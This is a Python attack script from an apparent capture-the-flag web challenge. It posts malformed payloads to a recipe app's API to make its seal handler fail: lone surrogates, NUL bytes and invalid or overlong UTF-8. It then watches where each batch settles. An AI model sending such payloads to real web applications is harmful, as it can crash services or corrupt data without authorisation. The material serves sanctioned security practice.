#!/usr/bin/env python3
"""Try to make the seal handler throw, so a batch ends unsealed with a SMALL header.

Every unsealed batch I have carries 16-34 KB of ingredient cookies, which means any second
robot that loads the same page would overflow its own verdict request too - so my "waiting for
the Chief" watches may be waiting on a state that is unfixable by design. A batch that is
unsealed because the *application* failed (not the transport) has small cookies and could be
cleaned up by exactly such a robot.

The classic way to make a write path throw is encoding: a lone surrogate in a JS string is
valid JSON but not valid UTF-8, a NUL byte survives JSON and is fine in Mongo but breaks
downstream string handling, and raw invalid UTF-8 bytes in the request body exercise the
parser. For each payload: does the batch get created, does the inspector settle it, and does
it end `reviewed` with an empty Seal cell while carrying only a handful of bytes of cookies?
That combination would be a genuinely new reachable state, and the right one for a sweep.
"""
import json
import re
import socket
import ssl
import sys
import time

from cc import new_baker

HOST = "tomorrow.web.2026.sunshinectf.games"


def log(*a):
    sys.stdout.buffer.write(("[%s] " % time.strftime("%H:%M:%S") + " ".join(str(x) for x in a)
                             + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def rawpost(path, rawbytes, cookie, ctype="application/json"):
    ctx = ssl.create_default_context()
    s = ctx.wrap_socket(socket.create_connection((HOST, 443), 25), server_hostname=HOST)
    req = ("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n"
           "Content-Type: %s\r\nCookie: %s\r\nContent-Length: %d\r\n\r\n"
           % (path, HOST, ctype, cookie, len(rawbytes)))
    s.sendall(req.encode() + rawbytes)
    buf = b""
    while True:
        d = s.recv(65536)
        if not d:
            break
        buf += d
    s.close()
    head, _, body = buf.partition(b"\r\n\r\n")
    code = int(head.split(b" ")[1])
    return code, body.decode("utf-8", "replace")


def cell(c, rid):
    code, dash, dt = c.get("/dashboard")
    blk = re.search(r"<tr>(?:(?!</tr>).)*?%s(?:(?!</tr>).)*?</tr>" % rid, dash or "", re.S)
    if not blk:
        return "norow", "?"
    b = blk.group(0)
    st = re.search(r'class="pill (\w+)">(\w+)</span>', b)
    tail = " ".join(re.sub(r"<[^>]+>", " ", b.split("</span>")[-1]).split())
    return ("NONE" if "&mdash;" in tail else ("standard" if "standard" in tail else tail[:24]),
            st.group(2) if st else "?")


u, c, _ = new_baker("th")
CK = "session=%s; role=baker" % c.jar["session"]
log("user %s" % u)

CASES = [
    ("lone-surrogate-title", b'{"title":"a\xed\xa0\x80z","ingredients":[{"name":"flour","value":"1"}]}'),
    ("esc-lone-surrogate", json.dumps({"title": "\ud800" * 3, "ingredients": [{"name": "f", "value": "1"}]}).encode("utf-8", "backslashreplace")),
    ("nul-title", b'{"title":"a\x00b","ingredients":[{"name":"f","value":"1"}]}'),
    ("nul-ingredient", b'{"title":"t","ingredients":[{"name":"a\x00b","value":"c\x00d"}]}'),
    ("invalid-utf8-bytes", b'{"title":"\xff\xfe","ingredients":[{"name":"f","value":"1"}]}'),
    ("overlong", b'{"title":"\xc0\xaf","ingredients":[{"name":"f","value":"1"}]}'),
    ("valid-pair-control", json.dumps({"title": "\U0001F600 ok", "ingredients": [{"name": "f", "value": "1"}]}).encode()),
    ("big-surrogate-ing", b'{"title":"t","ingredients":[{"name":"\xed\xa0\x80","value":"\xed\xa0\x80"}]}'),
    ("anomaly-an", b'{"title":"t","ingredients":[{"name":"\xef\xbf\xbd","value":"a\xffb"},{"name":"b","value":"\x0c"}]}'),
]

log("=== 1. save each payload, look for a 500 in the write path ===")
made = []
for label, raw in CASES:
    code, body = rawpost("/api/recipe", raw, CK)
    rid = None
    try:
        rid = json.loads(body).get("id")
    except Exception:
        pass
    log("  %-22s -> %s %s" % (label, code, body[:70].replace("\n", " ")))
    if rid:
        made.append((label, rid, raw))
    time.sleep(0.3)

log("=== 2. submit each created batch and read where it settles ===")
for label, rid, raw in made:
    code, body = rawpost("/api/recipe/%s/submit" % rid, b"{}", CK)
    seal = stt = "?"
    for k in range(14):
        time.sleep(5)
        seal, stt = cell(c, rid)
        if stt in ("reviewed", "reviewing"):
            break
    log("  %-22s submit %s -> %-9s seal=%s" % (label, code, stt, seal))
    if seal not in ("standard",):
        code2, page = None, c.get("/recipe/%s" % rid)[1]
        open("../files/throw_%s.html" % label.replace(" ", "_"), "w", encoding="utf-8").write(str(page))
        log("      !!! settled without a standard seal")

log("=== 3. does a poisoned string make MY OWN /api/seal throw instead of 403? ===")
for label, raw in CASES[:6]:
    code, body = rawpost("/api/seal", b'{"recipeId":"' + label.encode() + b'"}', CK)
    log("  %-22s /api/seal -> %s %s" % (label, code, body[:60].replace("\n", " ")))
log("done")
